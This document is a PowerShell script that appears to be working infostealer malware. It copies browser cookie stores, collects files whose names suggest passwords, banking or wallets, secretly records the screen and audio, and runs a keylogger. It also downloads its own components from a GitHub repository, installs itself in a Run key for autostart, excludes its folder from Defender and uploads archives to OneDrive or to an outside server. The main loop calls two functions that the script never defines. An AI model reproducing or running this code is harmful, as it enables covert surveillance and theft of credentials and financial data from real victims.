# luna.ps1 - PowerShell Agent: Cookies, Files, Video, Keylogger, AutoStart

$serverUrl = "https://onclick-back.onrender.com"
$tempDir = "$env:TEMP\luna"
$cookieDir = "$tempDir\cookies"
$fileDumpDir = "$tempDir\files"
$logPath = "$tempDir\log.json"
$keylogPath = "$tempDir\keylog.txt"
$videoDir = "$env:USERPROFILE"

New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir | Out-Null
Start-Transcript -Path "$tempDir\session.log" -Append

function Collect-Cookies {
    $targets = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    )
    $patterns = @("*Cookies*", "*.sqlite", "*.ldb", "*.log")

    foreach ($root in $targets) {
        if (Test-Path $root) {
            Get-ChildItem -Path $root -Recurse -Include $patterns -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -gt 0 } |
            ForEach-Object {
                try {
                    $name = ($_.FullName -replace '[^\w\d\-_\.]', '_')
                    Copy-Item $_.FullName "$cookieDir\$name" -Force -ErrorAction Stop
                } catch {}
            }
        }
    }
}

function Collect-Files {
    $targets = @("Desktop", "Documents", "Downloads") | ForEach-Object { "$env:USERPROFILE\$_" }
    $extensions = "*.pdf", "*.doc*", "*.xls*", "*.txt"
    $keywords = @("haslo", "login", "password", "secret", "bank", "karta", "card", "visa", "dane", "konto", "portfel", "millenium", "pko", "pekao", "sber", "wallet")
    $maxSize = 5MB

    foreach ($dir in $targets) {
        foreach ($ext in $extensions) {
            Get-ChildItem -Path $dir -Recurse -Include $ext -File -ErrorAction SilentlyContinue |
            Where-Object {
                $_.Length -le $maxSize -and
                $_.Name -ne $null -and
                ($keywords | Where-Object { $_ -and $_.ToLowerInvariant(); $_.Name.ToLowerInvariant().Contains($_) })
            } |
            ForEach-Object {
                try {
                    $name = ($_.Name -replace '[^\w\d\-_\.]', '_')
                    Copy-Item $_.FullName "$fileDumpDir\$name" -Force -ErrorAction Stop
                } catch {}
            }
        }
    }
}

function Start-Recording {
    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
    $videoDir = "$env:USERPROFILE\luna_video_fragments"
    if (!(Test-Path $videoDir)) { New-Item -ItemType Directory -Path $videoDir -Force | Out-Null }
    if (!(Test-Path $ffmpeg)) { return }

    $ts = Get-Date -Format "yyyyMMdd_HHmmss"
    $pattern = "$videoDir\frag_$ts_%03d.mp4"

    Start-Process -WindowStyle Hidden -FilePath $ffmpeg -ArgumentList @(
        "-f", "gdigrab", "-framerate", "15", "-i", "desktop",
        "-f", "dshow", "-i", "audio=virtual-audio-capturer",
        "-vcodec", "libx264", "-preset", "veryfast",
        "-acodec", "aac", "-ar", "44100", "-b:a", "128k",
        "-f", "segment", "-segment_time", "60",
        "-reset_timestamps", "1",
        "$pattern"
    )
}

"" | Out-File -Encoding utf8 -Force $keylogPath
Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -TypeDefinition '
    using System; using System.Runtime.InteropServices;
    public class KeyLogger {
        [DllImport("User32.dll")] public static extern short GetAsyncKeyState(Int32 vKey);
    }'
    $map = @{ 8 = "[Back]"; 13 = "[Enter]"; 32 = " "; 27 = "[Esc]"; 9 = "[Tab]" }
    $logPath = "$env:TEMP\luna\keylog.txt"
    while ($true) {
        for ($i = 1; $i -le 255; $i++) {
            if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
                $char = try { if ($map[$i]) { $map[$i] } else { [char]$i } } catch { "[?]" }
                Add-Content -Path $logPath -Value "$(Get-Date -Format HH:mm:ss) $char" -Encoding utf8
            }
        }
        Start-Sleep -Milliseconds 50
    }
}

function Ensure-Autostart {
    $path = "$env:APPDATA\Microsoft\Windows\luna"
    if (!(Test-Path $path)) {
        New-Item -ItemType Directory -Path $path -Force | Out-Null
        $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
        $files = @("luna.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "luna_launcher.bat")
        foreach ($f in $files) {
            Invoke-WebRequest "$repo/$f" -OutFile "$path\$f" -UseBasicParsing
        }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "luna" -Value "$path\luna_launcher.bat"
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    }
}

function Archive-And-Report {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $user = $env:USERNAME
    $videoDir = "$env:USERPROFILE\luna_video_fragments"
    $zipPath = "$env:USERPROFILE\luna_${user}_$timestamp.zip"

    $report = @{ user = $user; host = $env:COMPUTERNAME; timestamp = $timestamp }
    $meta = "$tempDir\info.txt"

    $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Encoding utf8
    "System: $user@$env:COMPUTERNAME`nDate: $timestamp" | Set-Content $meta

    $files = @($logPath, $meta, "$fileDumpDir\*", "$cookieDir\*", $keylogPath)
    if (Test-Path $videoDir) {
        $files += Get-ChildItem $videoDir -Filter *.mp4 | Select-Object -ExpandProperty FullName
    }

    Compress-Archive -Path $files -DestinationPath $zipPath -Force

    & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet

    if ($LASTEXITCODE -ne 0) {
        # fallback to Telegram
        $bytes = [System.IO.File]::ReadAllBytes($zipPath)
        $base64 = [System.Convert]::ToBase64String($bytes)
        $body = @{ data = $base64; filename = [IO.Path]::GetFileName($zipPath) } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
    }

    $summary = "Files: $((Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count), Cookies: $((Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count)"
    Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $summary } | ConvertTo-Json -Compress) -ContentType "application/json"
}

while ($true) {
    Collect-Cookies
    Collect-Files
    Start-Recording
    Ensure-Autostart
    Start-Sleep -Seconds 300
    Archive-And-Upload
    Cleanup
    Start-Sleep -Seconds 60
}

Stop-Transcript